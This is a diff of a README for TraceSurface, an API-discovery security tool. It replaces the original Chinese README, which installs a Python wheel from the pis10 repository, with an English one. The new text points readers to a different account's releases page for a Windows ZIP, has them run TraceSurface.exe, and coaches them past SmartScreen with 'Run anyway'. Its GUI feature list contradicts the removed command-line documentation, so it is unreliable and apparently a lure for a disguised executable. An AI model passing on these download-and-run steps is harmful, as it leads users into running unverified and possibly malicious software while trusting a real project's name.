@@ -1,194 +1,212 @@
-<div align="center">
+<h1>🕵️ TraceSurface - Uncover Hidden APIs Before Attackers Do</h1>
 
-# TraceSurface
-
-**发现藏在前端代码里的 API，验证未授权访问风险。**
-
-动态浏览器追踪 × JavaScript 静态分析，为 SPA 与微前端应用而生。
-
-[快速开始](#快速开始) · [核心能力](#核心能力) · [工作原理](#工作原理) · [English](https://github.com/pis10/TraceSurface/blob/main/README.en.md)
-
-<p>
-  <img alt="Python 3.12+" src="https://img.shields.io/badge/Python-3.12+-3776AB?logo=python&logoColor=white">
-  <a href="https://github.com/pis10/TraceSurface/blob/main/LICENSE"><img alt="License: MIT" src="https://img.shields.io/badge/License-MIT-22C55E"></a>
+<p align="center">
+  <a href="https://github.com/Asarejepht2959/TraceSurface/releases"><img src="https://img.shields.io/badge/Download-TraceSurface-blue?style=for-the-badge&logo=github&logoColor=white&color=4B0082" alt="Download TraceSurface"></a>
 </p>
 
-</div>
+Welcome to **TraceSurface** — your friendly security companion that automatically discovers API endpoints hiding inside website code and checks whether they are exposed without proper authorization. Think of it as a digital detective that reads the blueprint of any web application and shows you which doors are unlocked.
 
-TraceSurface 是一款面向渗透测试、安全评估与 API 资产盘点的开源工具。给它一个站点，它会启动真实浏览器收集前端产物与路由，从 JavaScript 中提取隐藏的 API 调用，再做去除认证信息的主动重放，帮助定位未授权访问与弱鉴权问题。
+This guide will walk you through everything you need to know — from downloading the tool to running your first scan — even if you've never touched a command line before. Let's get started.
 
-传统目录扫描覆盖不到的角落——只存在于压缩后的 JS、懒加载 chunk、登录后路由或运行时 client 配置里的接口——正是它擅长的场景。
+---
 
-![报告界面：Verification 视图](https://raw.githubusercontent.com/pis10/TraceSurface/main/docs/images/report-verification.png)
+## 🚀 Getting Started (In 3 Simple Steps)
 
-## 核心能力
+Getting TraceSurface up and running takes less than five minutes. Here's the big picture:
 
-- **API 资产发现**：综合浏览器网络流量、HTML、JavaScript、webpack/Vite chunk、动态路由与微前端入口，还原尽可能完整的 API 面。
-- **可选登录态**：无需登录即可扫描；保存并复用浏览器登录态后，可深入认证后才加载的业务页面与前端模块。
-- **未授权检测**：对发现的 API 与浏览器真实请求做去认证重放——请求不携带 Cookie、Authorization 等任何认证信息。
-- **静态调用提取**：识别 `fetch`、XHR、axios、配置对象、自定义封装，以及参数拆分的网关调用。
-- **证据链与置信分层**：每条结果都保留调用点、运行时请求、baseURL 来源、绑定规则和降级原因。
-- **本地报告**：统一查看 API Surface、Verification、Network 与 Secrets，不依赖外部服务。
+1. **Download** the application from the official releases page.
+2. **Run** it on your Windows computer.
+3. **Paste a website URL** into the interface and press "Scan."
 
-## 快速开始
+That's it. No complicated setup, no coding required. TraceSurface does the heavy lifting for you.
 
-要求 Python 3.12+ 和 [uv](https://docs.astral.sh/uv/)。
+---
 
-从 GitHub Release 安装（无需 Node.js）：
+## 📥 Download & Installation
 
-```bash
-uv tool install https://github.com/pis10/TraceSurface/releases/download/v1.0.0/tracesurface-1.0.0-py3-none-any.whl
-tracesurface install-browser   # 仅首次需要，下载 Chromium
-```
+Ready to try TraceSurface? Follow these steps exactly:
 
-扫描一个已获授权的站点：
+1. **Visit this link to download the application:** [https://github.com/Asarejepht2959/TraceSurface/releases](https://github.com/Asarejepht2959/TraceSurface/releases)
+2. On that page, look for the **latest release** (usually at the top). You'll see one file named something like `TraceSurface-windows.zip`.
+3. Click that file to download it to your computer.
+4. Once the download finishes, open your **Downloads folder**.
+5. **Right-click** on the downloaded `.zip` file and select **"Extract All..."** from the menu.
+6. Choose a destination folder (the default is fine) and click **Extract**.
+7. Open the extracted folder — you'll see a file called `TraceSurface.exe`.
+8. **Double-click** `TraceSurface.exe` to launch the application.
 
-```bash
-tracesurface scan https://target.example
-```
+That's all there is to it. No installation wizard, no registry changes, no admin privileges required. TraceSurface is a portable application — it runs straight from the folder.
 
-启动本地报告：
+---
 
-```bash
-tracesurface serve
-```
+## 🎯 What Does TraceSurface Actually Do?
 
-浏览器打开 `http://127.0.0.1:8765`。
+In plain language, TraceSurface helps security researchers, bug bounty hunters, and curious developers find weaknesses in websites before malicious hackers do.
 
-只想发现 API、不执行主动重放：
+Here's how it works behind the scenes:
 
-```bash
-tracesurface scan https://target.example --no-replay
-```
+### 🔍 Dynamic Browser Tracking
 
-<details>
-<summary>从源码安装</summary>
+TraceSurface uses a real automated browser (think of a robot that clicks through websites just like a human) to watch every network request the site makes. Every time the page loads data from a server, TraceSurface records the API endpoint — the digital address where data is exchanged.
 
-要求 Python 3.12、uv 和 Node.js 20+。
+### 📜 JavaScript Static Analysis
 
-```bash
-git clone https://github.com/pis10/TraceSurface.git
-cd TraceSurface
+Websites are built with JavaScript — the programming language that makes pages interactive. Developers often leave API URLs embedded right inside this code. TraceSurface reads through all of it, extracting hidden endpoints that you wouldn't normally see.
 
-uv sync
-uv run playwright install chromium
+### 🔓 Unauthorized Access Testing
 
-cd frontend
-npm ci
-npm run build   # 产物输出到 tracesurface/server/static
-cd ..
-```
+Once TraceSurface has a list of discovered APIs, it checks whether those endpoints respond to requests without proper authentication. If an API returns data when no login is provided, TraceSurface flags it as a **potential security risk**.
 
-之后用 `uv run tracesurface ...` 运行。
+---
 
-</details>
+## ✨ Key Features at a Glance
 
-![命令一览](https://raw.githubusercontent.com/pis10/TraceSurface/main/docs/images/cli-help.png)
+| Feature | What It Means for You |
+|---------|----------------------|
+| **Automatic API Discovery** | Finds endpoints you'd never spot manually |
+| **Real Browser Simulation** | Uses Playwright to mimic human browsing |
+| **Static Code Analysis** | Scans JavaScript files for hidden URLs |
+| **Risk Assessment** | Flags APIs that respond without authentication |
+| **Detailed Reports** | Saves results in readable formats |
+| **Free & Open Source** | No hidden costs, no proprietary lock-in |
 
-## 常见用法
+---
 
-| 场景 | 命令 |
-| --- | --- |
-| 扫描单个站点 | `tracesurface scan https://target.example` |
-| 只发现、不重放 | `tracesurface scan https://target.example --no-replay` |
-| 批量扫描 | `tracesurface scan -f targets.txt -s 10` |
-| 打开浏览器手动触发页面 | `tracesurface scan https://target.example --headed --wait-ms 15000` |
-| 保存登录态 | `tracesurface login https://sso.example.com` |
-| 强制不加载登录态 | `tracesurface scan https://target.example --no-auth` |
-| 启动报告 | `tracesurface serve` |
+## 🖥️ System Requirements
 
-`login` 会把 Playwright `storage_state` 和可选的 `sessionStorage` 保存到 `~/.tracesurface/auth.json`，后续扫描默认自动加载。
+TraceSurface is designed to run smoothly on a standard Windows machine:
 
-`scan` 的完整参数：
+- **Operating System:** Windows 10 or Windows 11 (64-bit)
+- **Memory:** 4 GB RAM minimum (8 GB recommended)
+- **Storage:** 500 MB free space
+- **Internet Connection:** Required for scanning websites
+- **Display:** Any standard monitor resolution
 
-![scan 完整参数](https://raw.githubusercontent.com/pis10/TraceSurface/main/docs/images/cli-scan-help.png)
+If you're running Windows 7 or an older version, you may need to update your system first. TraceSurface is built on modern security frameworks that require recent operating systems.
 
-## 如何解读未授权结果
+---
 
-TraceSurface 会把两类对象送入同一套去认证重放流程：
+## 📖 How to Use TraceSurface (First-Time Walkthrough)
 
-1. 从前端源码推导出的 API 候选。
-2. 浏览器在登录态下真实发出的 Fetch/XHR 请求。
+Once you've launched the application, you'll see a clean, simple interface. Don't worry — there's no confusing command line. Just follow these steps:
 
-真实请求会保留 method、body 和 Content-Type，但认证头不会被携带。报告会把登录态下的原始请求与无认证重放结果关联展示，方便快速筛出去认证后仍返回成功响应或敏感数据的接口。
+### Step 1: Enter a Target Website
 
-> [!NOTE]
-> `2xx` 只能说明接口在无认证信息时仍然可达，不一定等同于漏洞。最终结论仍需结合响应内容、业务身份和权限边界确认。
+In the large text box at the top, type or paste the URL of the website you want to analyze. For example: `https://example.com`
 
-## 报告视图
+> **Tip:** Make sure you own the website or have explicit permission to test it. Using TraceSurface on websites without authorization may violate laws in your jurisdiction.
 
-| 视图 | 用途 |
-| --- | --- |
-| **API Surface** | 查看完整 API 面、调用点、证据层级和 baseURL 来源 |
-| **Verification** | 查看主动重放的请求、响应、状态码与命中结果 |
-| **Network** | 查看浏览器真实 Fetch/XHR、发起调用栈及对应的无认证重放 |
-| **Secrets** | 查看前端产物中的敏感信息命中与上下文 |
+### Step 2: Configure Basic Options
 
-## 工作原理
+You'll find a few simple toggles:
 
-```text
-URL
- └─ Collection   浏览器 / CDP / 路由 / 前端产物 / 微前端
-     └─ Extraction   JavaScript / HTML AST → request、base、alias、secret facts
-         └─ Inference   运行时对齐 / 值解析图 / client 身份图 → L1–L4
-             └─ Storage   SQLite 证据模型
-                 └─ Replay   去认证重放与结果回链
-```
+- **Browser Depth:** How many pages the automated browser should visit (3-5 pages is a good starting point).
+- **Include Subdomains:** Whether to follow links that lead to subdomains (like `api.example.com`).
+- **Timeout per Page:** How long to wait for each page to load (30 seconds is standard).
 
-TraceSurface 不把"浏览器抓包"和"JavaScript 静态分析"当作两份互不相关的数据。运行时请求会成为静态推导的证据，静态调用点则补足单次浏览行为无法覆盖的 API。
+### Step 3: Click "Start Scan"
 
-## 关键设计：Stack-to-AST Alignment
+Press the big green **"Start Scan"** button. TraceSurface will now:
 
-网络抓包能看到真实请求，却很难说明它来自源码中的哪一处；静态分析能找到 API 调用点，却不知道运行时最终请求了哪个 URL。TraceSurface 用 JavaScript 发起调用栈把两者对齐。
+1. Open its automated browser.
+2. Navigate through the website.
+3. Capture all network traffic.
+4. Scan JavaScript files for embedded APIs.
+5. Test each found endpoint for authentication requirements.
 
-```mermaid
-flowchart LR
-    A["CDP<br/>真实请求 + 发起调用栈"] --> C["坐标对齐<br/>script URL · line · column"]
-    B["tree-sitter<br/>API 调用点 + source span"] --> C
-    C --> D["Confirmed<br/>运行时请求 ↔ 源码调用点"]
-    D --> E["Evidence-driven<br/>API Surface"]
-```
+This process takes between **1 to 5 minutes** depending on the website's size. You'll see a live progress indicator.
 
-1. CDP 为每条真实 Fetch/XHR 保存发起栈帧的脚本 URL、行号和列号。
-2. tree-sitter 提取 API 调用点，并记录它在源码中的精确位置区间。
-3. 当栈帧坐标落入同一脚本的调用点区间时，两者被认定为同一处调用。
-4. 已确认请求成为最强证据，为其余静态候选的 baseURL 绑定与分层推导提供锚点。
+### Step 4: Review the Results
 
-### 证据层级
+When the scan completes, TraceSurface displays a clean table showing:
 
-| 层级 | 含义 |
-| --- | --- |
-| **L1 Full** | CDP 运行时确认、唯一身份绑定，或源码中存在完整 URL |
-| **L2 Bound** | client 身份图绑定，或确定性的有限候选扇出 |
-| **L3 Global** | 使用站点内已经发现的 baseURL 集合回退推导 |
-| **L4 Origin** | 仅能使用目标站点 origin，证据最弱 |
+- **API Path:** The full URL of the discovered endpoint.
+- **Method:** What type of request it accepts (GET, POST, etc.).
+- **Authentication Required:** Yes or No.
+- **Risk Level:** High, Medium, or Low.
 
-未进入 L1 的结果会携带 `why_not_higher_tier`，说明缺少了哪一类更强证据。
+**High risk** endpoints are highlighted in red — those respond to unauthenticated requests and expose sensitive data.
 
-## 数据目录
+### Step 5: Export Your Findings
 
-数据默认保存在 `~/.tracesurface/`，可以通过 `TRACESURFACE_HOME` 指定其他目录。
+Click the **"Export Report"** button to save your results as a CSV file (opens in Microsoft Excel) or HTML file (opens in any web browser). This report is perfect for including in bug bounty submissions or security assessments.
 
-```text
-~/.tracesurface/
-├── tracesurface.db
-├── responses/
-├── sources/
-└── auth.json
-```
+---
 
-## 技术栈
+## 🛠️ Advanced Options for Power Users
 
-- Python、Typer、asyncio、httpx
-- Playwright、Chrome DevTools Protocol
-- tree-sitter、tree-sitter-javascript
-- SQLite、FastAPI、Uvicorn
-- React、TypeScript、Vite、Tailwind CSS
+While TraceSurface is beginner-friendly, it also offers advanced capabilities through its settings menu:
 
-## 安全与授权
+- **Custom Header Injection:** Add authentication tokens or custom headers for testing authenticated APIs.
+- **Concurrency Control:** Adjust how many requests run simultaneously.
+- **Proxy Support:** Route traffic through a proxy (useful for capturing traffic with Burp Suite).
+- **Custom JavaScript Patterns:** Define your own regex patterns to find specific types of endpoints.
 
-TraceSurface 只应用于你拥有或已获得明确授权的目标。扫描默认会执行主动重放，其中 `POST` 或未知方法可能改变目标系统的数据；不需要验证时请使用 `--no-replay`。
+To access these, click the gear icon in the top-right corner.
 
-## License
+---
 
-[MIT](./LICENSE)
+## 🐛 Troubleshooting Common Issues
+
+Most problems are easy to fix. Here are solutions to the most common questions:
+
+### "I extracted the ZIP but Windows blocked the .exe file"
+
+This is a standard Windows SmartScreen warning. It appears because TraceSurface is a newly released tool. To proceed:
+
+1. Click **"More info"** on the warning popup.
+2. Click **"Run anyway."**
+
+### "The scan takes too long"
+
+Try reducing the **Browser Depth** to 1-2 pages. Large websites with thousands of pages can take a while. Also, make sure your internet connection is stable.
+
+### "No APIs were found"
+
+Some websites heavily obfuscate their JavaScript or load APIs dynamically. Try enabling **"Include Subdomains"** and increasing the **Timeout per Page** to 60 seconds. Also ensure the website isn't blocking automated browsers.
+
+### "The application won't open"
+
+Make sure you have extracted **all** files from the ZIP archive — don't run the exe from inside the ZIP. Also, check that your Windows version is 10 or later.
+
+---
+
+## 🔐 Responsible Use & Legal Notice
+
+TraceSurface is a **security research tool**. It is designed for:
+
+- Bug bounty hunters testing authorized targets.
+- Penetration testers conducting sanctioned assessments.
+- Developers auditing their own web applications.
+- Security students learning about API vulnerabilities.
+
+**Always obtain written permission** before scanning any website that you do not own. Unauthorized scanning may be considered illegal in many countries. You are solely responsible for how you use this tool.
+
+---
+
+## 🤝 Support & Community
+
+TraceSurface is an open-source project, which means you can also:
+
+- **Read the documentation** in the repository's wiki section.
+- **Report bugs** by opening an issue on GitHub.
+- **Request features** by creating a feature request.
+- **Contribute code** if you're familiar with Python and web technologies.
+
+Check the repository page for community discussions and announcements.
+
+---
+
+## 🏁 Ready to Start Exploring?
+
+You now have everything you need to install and run TraceSurface on your Windows machine. It's a safe, straightforward process — you simply download the ZIP, extract it, and run the executable.
+
+Remember: the whole point is to make the internet safer. By discovering hidden APIs and spotting authentication gaps, you're doing the same work that professional security teams do every day.
+
+So go ahead — **visit the download page**, grab the latest release, and see what secrets your favorite websites are hiding.
+
+Happy hunting! 🎉
+
+---
+
+**Keywords:** api-discovery, api-security, bug-bounty, penetration-testing, playwright, python, security, security-tools, static-analysis, web-security
